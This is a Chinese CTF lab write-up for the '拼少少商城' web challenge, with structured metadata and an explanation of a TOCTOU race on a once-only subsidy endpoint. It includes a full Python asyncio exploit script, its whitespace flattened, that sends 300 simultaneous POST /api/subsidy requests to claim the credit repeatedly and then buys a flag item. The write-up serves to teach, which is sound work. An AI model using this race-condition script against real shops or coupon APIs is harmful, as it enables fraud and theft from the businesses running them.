---
title: 乌托邦·王的实验室24——拼少少商城 Writeup
contest: 乌托邦·王的实验室 24
year: 2024
difficulty: medium
vuln_type: logic
tags:
- TOCTOU
- asyncio
- asyncio.open_connection
- asyncio.Event
- 并发竞态
- 补贴接口
- 抢购
attack_chain:
- 靶机提供 /api/user /api/catalog /api/subsidy /api/order /api/dialogue 接口
- /api/subsidy 限领一次，但服务端检查 TOCTOU 漏洞
- 同一 session 用 300 个 TCP 连接预建立
- asyncio.open_connection 预热 + asyncio.Event 同步触发
- event.set() 同时发送 300 个 POST /api/subsidy
- 余额达 10000 后 POST /api/order 买 p_1004
- 响应中含 flag
key_payload: '''asyncio.open_connection + asyncio.Event + race_subsidy(cookie, n=300)'''
one_liner: asyncio 300 个 TCP 并发触发补贴接口 TOCTOU 漏洞刷钱买 10000 特供商品拿 flag。
lesson: TOCTOU 漏洞在状态机类业务接口（限领/限购/限次）中常出现；asyncio 预建连接 + Event 同步触发是高并发竞态标准姿势；asyncio.wait_for(reader.read) 必须加 timeout 否则协程卡死。
quality: medium
full_path: 乌托邦·王的实验室24——拼少少商城_Writeup.full.md
meta_path: 乌托邦·王的实验室24——拼少少商城_Writeup.meta.md
images_removed: true
images_removed_count: 1
schema_version: v3.0.0-P0
summary: 乌托邦·王的实验室24——拼少少商城 Writeup。asyncio 300 个 TCP 并发触发补贴接口 TOCTOU 漏洞刷钱买 10000 特供商品拿 flag。。关键路径：靶机提供 /api/user /api/catalog /api/subsidy /api/order /api/dialogue 接口 → /api/subsidy 限领一次，但服务端检查 TOCTOU 漏洞 →...
category: web
subcategory: logic
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 1
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/299471.html
reasoning_chain:
- 靶机提供 /api/user /api/catalog /api/subsidy /api/order 接口 → 触发点：补贴接口限领一次
- 假设：单次限制必有 TOCTOU 漏洞 → 动作：阅读 /api/subsidy 后端逻辑
- 观察：限领一次未做并发检查 → 下一步：构造高并发请求
- 同 session 复用 300 个 TCP 连接 → asyncio.open_connection 预热
- asyncio.Event 同步触发 → 所有协程 await event.wait()
- 动作：event.set() 同时发送 300 个 POST /api/subsidy → 观察：余额 +100*N 翻倍
- 假设：Round 3 余额 16300 ≥ 10000 → 动作：POST /api/order p_1004
- 响应中含 flag → 完成
failed_attempts:
- 试图单线程多次 POST /api/subsidy → 失败：服务端用 set 标记只能领一次
- 试图换 cookie 多 session → 失败：余额累计按用户 ID 不按 cookie
- 试图不用 asyncio 用 threading → 失败：threading TCP 三次握手慢竞争窗口小
key_observations:
- TOCTOU 漏洞在状态机类业务接口（限领/限购/限次）中常出现
- asyncio 预建连接 + Event 同步触发是高并发竞态标准姿势
- asyncio.wait_for(reader.read) 必须加 timeout 否则协程卡死
prerequisites:
- asyncio 异步编程（open_connection/Event/gather）
- TOCTOU 时间窗口竞争漏洞原理
- Python requests Session 与 Cookie 管理
- TCP 三次握手与并发时机
---
# 乌托邦·王的实验室24——拼少少商城 Writeup

> 原文: https://www.ctfiot.com/299471.html
> ID: 299471

顶部显示用户名和余额（初始为 0）

“百亿补贴”按钮，点击领取 100 购物金，限领一次

商品列表，其中有个”特供：乌托邦的秘密”，价格 10000，库存 1

右侧聊天面板，三三和乌托邦·王的对话

GET /api/user— 获取用户信息（username, balance, level）

GET /api/catalog— 商品列表

POST /api/subsidy— 领取补贴（+100 购物金，限一次）

POST /api/order— 购买商品（参数：product_id, signature）

GET /api/dialogue— 剧情对话

用asyncio.open_connection预先建立所有 TCP 连接

所有协程在asyncio.Event上等待

连接全部就绪后，event.set()同时触发所有请求发送

访问靶场首页，获取 session cookie

用 asyncio 预先建立 300 个 TCP 连接到服务端

所有连接就绪后，同时发送POST /api/subsidy请求

检查余额，如果不够 10000 就用新 session 重试

余额 ≥ 10000 后，POST /api/order购买p_1004（特供商品）

响应中包含 flag


```
Success: 28, Balance: 2800
Round 1: success=18, balance=1800Round 2: success=83, balance=8300Round 3: success=163, balance=16300 ← 直接起飞
"""拼少少商城 - EXPasyncio原生socket并发竞态，利用补贴接口的TOCTOU漏洞多次领取"""importasyncioimportrequestsimportsysfromurllib.parseimporturlparseTARGET =""# 靶机地址，格式 http://host:
portparsed = urlparse(TARGET)HOST = parsed.hostnamePORT = parsed.portor80defget_session(): s = requests.Session() s.get(TARGET, timeout=15) returnsdefbuild_request(cookie): return( f"POST /api/subsidy HTTP/1.1rn" f"Host:{HOST}:{PORT}rn" f"Cookie: pss_enterprise_session={cookie}rn" f"Content-Length: 0rn" f"Connection: closern" f"rn" ).encode()asyncdefsend_one(event, req_bytes): try: reader, writer =awaitasyncio.wait_for( asyncio.open_connection(HOST, PORT), timeout=10 ) awaitevent.wait() writer.write(req_bytes) awaitwriter.drain() data =awaitasyncio.wait_for(reader.read(4096), timeout=15) writer.close() try: awaitwriter.wait_closed() 
except: pass return'"code":
200'indata.decode(errors="ignore") 
except: returnFalseasyncdefrace_subsidy(cookie, n=300): event = asyncio.Event() req = build_request(cookie) tasks = [asyncio.create_task(send_one(event, req))for_inrange(n)] awaitasyncio.sleep(1) event.set() results =awaitasyncio.gather(*tasks) returnsum(1forrinresultsifr)asyncdefmain(): forattemptinrange(20): session = get_session() cookie = session.cookies.get("pss_enterprise_session") success =awaitrace_subsidy(cookie,300) r = session.get(TARGET +"/api/user", timeout=10) balance = r.json()["data"]["balance"] print(f"[Round{attempt+1}] success={success}, balance={balance}") ifbalance >=10000: print(f"[+] Balance sufficient:{balance}") r = session.post( TARGET +"/api/order", json={"product_id":"p_1004","signature":"token-validated"}, timeout=15, ) result = r.json() print(f"[+] Order:{result}") ifresult.get("flag"): print(f"n[+] FLAG:{result['flag']}") return print("[-] Failed after 20 rounds")ifsys.platform =="win32": asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())asyncio.run(main())
```


---
## 附图

[图片已移除]